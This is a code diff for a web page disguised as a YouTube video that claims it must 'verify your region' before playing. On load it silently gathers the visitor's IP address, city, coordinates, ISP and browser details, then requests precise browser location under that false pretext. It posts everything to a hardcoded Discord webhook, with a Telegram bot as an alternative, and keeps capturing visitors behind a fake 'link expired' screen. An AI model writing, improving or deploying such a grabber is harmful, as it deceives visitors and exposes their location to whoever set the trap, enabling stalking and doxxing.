@@ -67,9 +67,6 @@
             border-bottom: 14px solid transparent;
             margin-left: 4px;
         }
-        .video-wrapper:hover .play-button {
-            background: rgba(255,255,255,0.25);
-        }
         .hidden { display: none !important; }
         .expired-overlay {
             position: absolute;
@@ -96,25 +93,42 @@
             pointer-events: none;
             z-index: 2;
         }
+        /* Debug console - shows on page for testing */
+        #debugConsole {
+            margin-top: 16px;
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #0f0;
+            max-height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+        #debugConsole .err { color: #ff5252; }
+        #debugConsole .ok  { color: #00c853; }
+        #debugConsole .warn { color: #ffa726; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="video-wrapper" id="videoWrapper">
-        <!-- Thumbnail + play button -->
         <img id="thumbnail" src="https://img.youtube.com/vi/kLDxvP5X2GY/maxresdefault.jpg" alt="Video" />
         <div class="play-button"></div>
         <div class="hint-text">Click to verify your region and play video</div>
-
-        <!-- Real video (hidden initially) -->
         <iframe id="videoPlayer" class="hidden" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-
-        <!-- Expired overlay (hidden initially) -->
         <div class="expired-overlay hidden" id="expiredOverlay">
             <h2>🔒 This link has expired</h2>
             <p>This video was a one-time view and is no longer available.</p>
         </div>
+    </div>
+
+    <!-- DEBUG CONSOLE - shows what's happening -->
+    <div id="debugConsole">
+        <div class="warn">⏳ Initializing...</div>
     </div>
 </div>
 
@@ -125,8 +139,16 @@
     // ============================================================
     //  CONFIGURE THESE
     // ============================================================
-    const VIDEO_ID = 'kLDxvP5X2GY'; // Just the video ID from your YouTube link
-    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN'; // ← FIX THIS
+    const VIDEO_ID = 'kLDxvP5X2GY';
+    
+    // === OPTION 1: DISCORD WEBHOOK ===
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1523295864053960824/OcxLxDP-6B5htEA311dzHT1u7qxOKJxChlVPX_PJwFc___7QgGzPe_78rkKGkLQtMLVU';
+    
+    // === OPTION 2: TELEGRAM BOT (alternative if Discord doesn't work) ===
+    // Create a bot at https://t.me/BotFather, get the token
+    // Then message your bot, then get your chat ID from https://t.me/userinfobot
+    const TELEGRAM_BOT_TOKEN = ''; // e.g., '123456789:ABCdefGHIjklmNOPqrSTUvwxYZ'
+    const TELEGRAM_CHAT_ID = '';    // e.g., '123456789'
 
     // ============================================================
     //  DOM refs
@@ -137,77 +159,183 @@
     const videoWrapper   = document.getElementById('videoWrapper');
     const videoPlayer    = document.getElementById('videoPlayer');
     const expiredOverlay = document.getElementById('expiredOverlay');
+    const debugConsole   = document.getElementById('debugConsole');
+
+    function debug(msg, type = 'ok') {
+        const div = document.createElement('div');
+        div.className = type;
+        div.textContent = `> ${msg}`;
+        debugConsole.appendChild(div);
+        debugConsole.scrollTop = debugConsole.scrollHeight;
+        console.log(msg);
+    }
 
     // ============================================================
-    //  Single-use check (localStorage)
+    //  Single-use check
     // ============================================================
     const alreadyAccessed = localStorage.getItem('vt_accessed');
 
     // ============================================================
-    //  Send data to Discord
+    //  SEND TO DISCORD
     // ============================================================
-    async function sendToDiscord(ipData, preciseGeo) {
-        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('YOUR_WEBHOOK')) {
-            console.log('No webhook configured. Data:', ipData);
-            return;
+    async function sendToDiscord(text) {
+        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === 'PASTE_YOUR_DISCORD_WEBHOOK_URL_HERE') {
+            debug('Discord: No webhook configured', 'warn');
+            return false;
         }
-
-        let msg = '**🎯 New Visitor Captured**\n';
-        msg += `**IP:** ${ipData.ip || 'N/A'}\n`;
-        msg += `**Country:** ${ipData.countryName || ipData.country || 'N/A'}\n`;
-        msg += `**Region:** ${ipData.regionName || ipData.region || 'N/A'}\n`;
-        msg += `**City:** ${ipData.cityName || ipData.city || 'N/A'}\n`;
-        msg += `**Postal:** ${ipData.zipCode || ipData.zip || 'N/A'}\n`;
-        msg += `**Lat/Lon:** ${ipData.latitude || ipData.lat || 'N/A'}, ${ipData.longitude || ipData.lon || 'N/A'}\n`;
-        msg += `**ISP:** ${ipData.isp || ipData.org || 'N/A'}\n`;
-        msg += `**User-Agent:** ${navigator.userAgent}\n`;
-        msg += `**Time:** ${new Date().toISOString()}\n`;
-
-        if (preciseGeo) {
-            msg += `**📍 Precise:** ${preciseGeo.lat}, ${preciseGeo.lon} (±${preciseGeo.accuracy})\n`;
-        }
-
         try {
-            await fetch(DISCORD_WEBHOOK, {
+            debug('Sending to Discord...');
+            const resp = await fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: msg })
+                body: JSON.stringify({ content: text })
             });
-            console.log('✅ Sent to Discord');
+            if (resp.ok) {
+                debug('✅ Sent to Discord successfully!', 'ok');
+                return true;
+            } else {
+                debug(`Discord error: ${resp.status} ${resp.statusText}`, 'err');
+                return false;
+            }
         } catch (e) {
-            console.error('Discord send failed:', e);
+            debug(`Discord fetch failed: ${e.message}`, 'err');
+            return false;
         }
     }
 
     // ============================================================
-    //  STEP 1 — IP Geolocation (HTTPS, CORS friendly, no key)
+    //  SEND TO TELEGRAM (alternative)
+    // ============================================================
+    async function sendToTelegram(text) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            debug('Telegram: Not configured', 'warn');
+            return false;
+        }
+        try {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const resp = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            });
+            if (resp.ok) {
+                debug('✅ Sent to Telegram!', 'ok');
+                return true;
+            } else {
+                const data = await resp.json();
+                debug(`Telegram error: ${data.description}`, 'err');
+                return false;
+            }
+        } catch (e) {
+            debug(`Telegram failed: ${e.message}`, 'err');
+            return false;
+        }
+    }
+
+    // ============================================================
+    //  Build message and send to all channels
+    // ============================================================
+    async function sendData(ipData, preciseGeo) {
+        let msg = '🎯 *New Visitor Captured*\n';
+        msg += `IP: ${ipData?.ip || 'N/A'}\n`;
+        msg += `Country: ${ipData?.countryName || ipData?.country || 'N/A'}\n`;
+        msg += `Region: ${ipData?.regionName || ipData?.region || 'N/A'}\n`;
+        msg += `City: ${ipData?.cityName || ipData?.city || 'N/A'}\n`;
+        msg += `Lat/Lon: ${ipData?.latitude || ipData?.lat || 'N/A'}, ${ipData?.longitude || ipData?.lon || 'N/A'}\n`;
+        msg += `ISP: ${ipData?.isp || ipData?.org || 'N/A'}\n`;
+        msg += `Browser: ${navigator.userAgent}\n`;
+        msg += `Time: ${new Date().toISOString()}\n`;
+
+        if (preciseGeo) {
+            msg += `📍 *Precise Location:* ${preciseGeo.lat}, ${preciseGeo.lon} (${preciseGeo.accuracy})`;
+        }
+
+        // Try Discord first
+        const discordSent = await sendToDiscord(msg);
+        // Also try Telegram
+        await sendToTelegram(msg);
+
+        if (!discordSent) {
+            debug('Neither Discord nor Telegram worked. Check your webhook URLs.', 'err');
+            debug('Message that should have been sent:', 'warn');
+            debug(msg, 'warn');
+        }
+    }
+
+    // ============================================================
+    //  IP Geolocation
     // ============================================================
     async function captureIP() {
-        try {
-            const r = await fetch('https://free.freeipapi.com/api/json/');
-            const d = await r.json();
-            console.log('IP data:', d);
-            return d;
-        } catch (err) {
-            console.error('IP capture error:', err);
-            return null;
+        // Try multiple APIs in order
+        const apis = [
+            'https://free.freeipapi.com/api/json/',
+            'https://ipapi.co/json/',
+            // Last resort - might be HTTP only but worth trying
+            'http://ip-api.com/json/?fields=status,query,country,regionName,city,lat,lon,isp,org'
+        ];
+
+        for (const api of apis) {
+            try {
+                debug(`Trying IP API: ${api.split('/')[2]}...`);
+                const r = await fetch(api);
+                const d = await r.json();
+                
+                // Check different response formats
+                if (d.ip || d.query) {
+                    debug(`✅ Got IP data from ${api.split('/')[2]}`, 'ok');
+                    // Normalize the response
+                    return {
+                        ip: d.ip || d.query,
+                        country: d.countryName || d.country_name || d.country,
+                        region: d.regionName || d.region_name || d.region,
+                        city: d.cityName || d.city_name || d.city,
+                        latitude: d.latitude || d.lat,
+                        longitude: d.longitude || d.lon,
+                        isp: d.isp || d.org
+                    };
+                }
+            } catch (e) {
+                debug(`API ${api.split('/')[2]} failed: ${e.message}`, 'err');
+            }
         }
+
+        debug('❌ All IP APIs failed!', 'err');
+        return null;
     }
 
     // ============================================================
-    //  STEP 2 — Browser Geolocation (requires user permission)
+    //  Browser Geolocation
     // ============================================================
     function getPreciseLocation() {
         return new Promise(resolve => {
-            if (!navigator.geolocation) return resolve(null);
+            if (!navigator.geolocation) {
+                debug('Geolocation API not available in browser', 'err');
+                return resolve(null);
+            }
+            debug('Requesting browser location (check for popup)...');
+            
             navigator.geolocation.getCurrentPosition(
-                pos => resolve({
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy + 'm'
-                }),
-                () => resolve(null),
-                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                pos => {
+                    debug(`✅ Got precise location: ${pos.coords.latitude}, ${pos.coords.longitude}`, 'ok');
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy + 'm'
+                    });
+                },
+                err => {
+                    let reason = 'Unknown error';
+                    if (err.code === 1) reason = 'User denied permission';
+                    else if (err.code === 2) reason = 'Position unavailable';
+                    else if (err.code === 3) reason = 'Timed out';
+                    debug(`❌ Location failed: ${reason}`, 'err');
+                    resolve(null);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         });
     }
@@ -222,6 +350,7 @@
         hintText.classList.add('hidden');
         videoPlayer.classList.remove('hidden');
         videoPlayer.src = `https://www.youtube.com/embed/${VIDEO_ID}?autoplay=1`;
+        debug('▶️ Video playing');
     }
 
     function showExpired() {
@@ -229,37 +358,39 @@
         playButton.classList.add('hidden');
         hintText.classList.add('hidden');
         expiredOverlay.classList.remove('hidden');
+        debug('🔒 Link already used - showing expired');
     }
 
     // ============================================================
     //  MAIN
     // ============================================================
     async function init() {
-        // Already accessed?
         if (alreadyAccessed) {
             showExpired();
             const ip = await captureIP();
-            if (ip) sendToDiscord(ip, null);
+            if (ip) await sendData(ip, null);
             return;
         }
 
-        // Capture IP silently on load
+        // Capture IP on page load
+        debug('Page loaded, capturing IP...');
         const ipData = await captureIP();
 
         // Wait for click
         videoWrapper.addEventListener('click', async function onClick() {
             videoWrapper.removeEventListener('click', onClick);
-
-            // Request precise location (triggers browser prompt)
+            debug('👆 User clicked!');
+            
             const precise = await getPreciseLocation();
-
-            // Play video
             playVideo();
-
-            // Send everything
+            
             if (ipData) {
-                await sendToDiscord(ipData, precise);
+                await sendData(ipData, precise);
+            } else {
+                debug('No IP data to send', 'err');
             }
+            
+            debug('✅ Done! Check Discord/Telegram.', 'ok');
         });
     }
 
